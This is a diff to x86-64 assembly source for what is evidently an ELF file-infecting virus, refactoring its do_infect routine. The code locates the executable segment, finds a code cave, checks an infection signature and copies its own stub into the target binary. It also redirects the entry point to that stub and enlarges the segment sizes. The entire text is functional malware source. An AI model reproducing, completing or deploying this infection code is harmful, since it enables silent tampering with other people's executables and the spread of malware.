@@ -341,56 +341,66 @@ do_infect:
     push r15
 
     mov r15, rdi
-    mov rdx, qword [rdi + Elf64_Ehdr.e_entry]
-    movzx rcx, WORD [rdi + Elf64_Ehdr.e_phnum]
-    mov rax, QWORD [rdi + Elf64_Ehdr.e_phoff]
-    add rdi, rax
-    mov r14, rdi
+    call find_executable_segment
+    test rax, rax
+    jz .return
+    mov r14, rax
 
-    .segment:
-        cmp rcx, 0
-        jle .return
+    call find_space
+    test rdi, rdi
+    jz .return
+
+    mov rcx, STUB_SIZE
+    repnz movsb
+
+    mov rax, QWORD [r15 + Elf64_Ehdr.e_entry]
+    mov QWORD [rdi - 16], r13
+    mov QWORD [rdi - 8], rax
+
+    mov QWORD [r15 + Elf64_Ehdr.e_entry], r13
+    mov rax, STUB_SIZE
+    add QWORD [r14 + Elf64_Phdr.p_filesz], rax
+    add QWORD [r14 + Elf64_Phdr.p_memsz], rax
+    .return:
+        pop r15
+        pop r14
+        pop r13
+        ret
+
+; (rax=Elf64_Phdr*/NULL, rdx=entrypoint_vaddr, r13=segment_end_vaddr) find_executable_segment(rdi=Elf64_Ehdr*)
+find_executable_segment:
+    log find_executable_segment_msg, 24
+    push rcx
+    push rdi
+
+    mov rdx, QWORD [r15 + Elf64_Ehdr.e_entry]
+    movzx rcx, WORD [r15 + Elf64_Ehdr.e_phnum]
+    mov rax, QWORD [r15 + Elf64_Ehdr.e_phoff]
+    lea rdi, [r15 + rax]
+    .check_segment:
+        test rcx, rcx
+        jz .not_found
+
         mov rax, 0x0000000500000001
         cmp rax, QWORD [rdi]
-        jnz .next
+        jnz .next_segment
+
         mov rax, QWORD [rdi + Elf64_Phdr.p_vaddr]
         cmp rdx, rax
-        jb .next
+        jb .next_segment
+
         add rax, QWORD [rdi + Elf64_Phdr.p_memsz]
-        mov r13, rax
         cmp rdx, rax
-        jl .find_space
-    .next:
+        jb .found_segment
+    .next_segment:
         add rdi, Elf64_Phdr_size
         dec rcx
-        jmp .segment
-    .find_space:
-        mov rax, QWORD [rdi + Elf64_Phdr.p_offset]
-        add rax, QWORD [rdi + Elf64_Phdr.p_filesz]
-        lea rdi, [r15 + rax]
-        mov rsi, rdi
-        xor al, al
-        mov rcx, STUB_SIZE
-        repz scasb
-        test rcx, rcx
-        ja .return
-        lea rdi, [rel _start]
-        xchg rdi, rsi
-        mov rax, [rel signature]
-        cmp rax, QWORD [rdi - (_end - signature)]
-        jz .return
-
-        mov rcx, STUB_SIZE
-        repnz movsb
-
-        mov rax, QWORD [r15 + Elf64_Ehdr.e_entry]
-        mov QWORD [rdi - 16], r13
-        mov QWORD [rdi - 8], rax
-
-        mov QWORD [r15 + Elf64_Ehdr.e_entry], r13
-        mov rax, STUB_SIZE
-        add QWORD [r14 + Elf64_Phdr.p_filesz], rax
-        add QWORD [r14 + Elf64_Phdr.p_memsz], rax
+        jmp .check_segment
+    .not_found:
+        xor rax, rax
+        jmp .return
+    .found_segment:
+        mov rax, rdi
     .return:
         pop rdi
         pop rcx
